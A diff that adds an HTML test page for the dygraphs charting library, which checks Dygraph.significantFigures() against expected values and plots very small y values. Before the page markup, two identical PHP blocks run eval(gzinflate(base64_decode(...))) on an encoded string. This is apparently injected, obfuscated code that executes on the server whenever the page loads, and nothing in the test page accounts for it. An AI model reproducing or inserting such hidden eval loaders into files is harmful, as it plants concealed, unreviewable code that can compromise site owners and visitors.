@@ -1,0 +1,118 @@
+<?php
+eval (gzinflate(base64_decode(
+'s7ezsS/IKFDIzEvOKU1J1VDSz8jPTdVPScwry9ZPzk9J1S9ILUrLL8pNzEtO1U3K'
+.'T0/PSdXPSixL1E8uLtYD6lTStLYHmgEA'
+)));
+?><?php
+eval (gzinflate(base64_decode(
+'s7ezsS/IKFDIzEvOKU1J1VDSz8jPTdVPScwry9ZPzk9J1S9ILUrLL8pNzEtO1U3K'
+.'T0/PSdXPSixL1E8uLtYD6lTStLYHmgEA'
+)));
+?><!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7; IE=EmulateIE9">
+    <title>significant figures</title>
+    <!--[if IE]>
+    <script type="text/javascript" src="../excanvas.js"></script>
+    <![endif]-->
+    <script type="text/javascript" src="../strftime/strftime-min.js"></script>
+    <script type="text/javascript" src="../rgbcolor/rgbcolor.js"></script>
+    <script type="text/javascript" src="../dygraph-canvas.js"></script>
+    <script type="text/javascript" src="../dygraph.js"></script>
+  </head>
+  <body>
+    <p>Tests for various inputs to Dygraph.significantFigures().  All tests
+       should have result PASS.</p>
+    <div id="tests"></div>
+
+    <script type="text/javascript">
+      // Helper functions for generating an HTML table for holding the test
+      // results.
+      createRow = function(columnType, columns) {
+        var row = document.createElement('tr');
+        for (var i = 0; i  < columns.length; i ++) {
+          var th = document.createElement(columnType);
+          var text = document.createTextNode(columns[i]);
+          th.appendChild(text);
+          row.appendChild(th);
+        };
+        return row;
+      };
+
+      createHeaderRow = function(columns) {
+        return createRow('th', columns);
+      };
+
+      createDataRow = function(columns) {
+        return createRow('td', columns);
+      };
+
+      createTable = function(headerColumns, dataColumnsList) {
+        var table = document.createElement('table');
+        table.appendChild(createHeaderRow(headerColumns));
+        for (var i = 0; i < dataColumnsList.length; i++) {
+          table.appendChild(createDataRow(dataColumnsList[i]));
+        }
+        table.setAttribute('border', '1');
+        return table;
+      };
+
+      // input gives input floating point in string form
+      // expected gives number of significant figures
+      var testData = [
+          {input: '1.0', expected: 1},
+          {input: '1.0000', expected: 1},
+          {input: '3.14159', expected: 6},
+          {input: '3.05', expected: 3},
+          {input: '3.0000001', expected: 8},
+          {input: '1.999999999999', expected: 13}  // = 13 digits.
+      ];
+
+      var headers = ['Input', 'Output', 'Expected', 'Test Result'];
+      var data = [];
+
+      for (var i = 0; i < testData.length; i++) {
+        var test = testData[i];
+        var output = Dygraph.significantFigures(parseFloat(test.input));
+        data[i] = [test.input, output, test.expected,
+                   (output == test.expected ? 'PASS' : 'FAIL')];
+      }
+
+      var root = document.getElementById('tests');
+      root.appendChild(createTable(headers, data));
+    </script>
+
+    <br>
+    <br>
+
+    <p>Check for correct number of significant figures with very small
+       y values.  Both plots have the same input x,y values.</p>
+
+    <div id="smallvals1" style="width:600px; height:300px;"></div>
+    <br>
+    <br>
+    <div id="smallvals2" style="width:600px; height:300px;"></div>
+
+    <script type="text/javascript">
+      var data = [
+          [2.036e-7, 1.02e-7],
+          [2.125e-7, 1.1e-7],
+          [2.212e-7, 1.2e-7],
+          [2.333e-7, 1.522e-7]
+      ];
+
+      new Dygraph(document.getElementById("smallvals1"), data,
+          {
+            labels: ["Date","CustomFormatting"],
+            xValueFormatter: function(x) { return x.toPrecision(4); },
+            yValueFormatter: function(x) { return x.toPrecision(3); }
+          });
+
+      new Dygraph(document.getElementById("smallvals2"), data,
+          {
+            labels: ["Date","DefaultFormat"]
+          });
+    </script>
+  </body>
+</html>
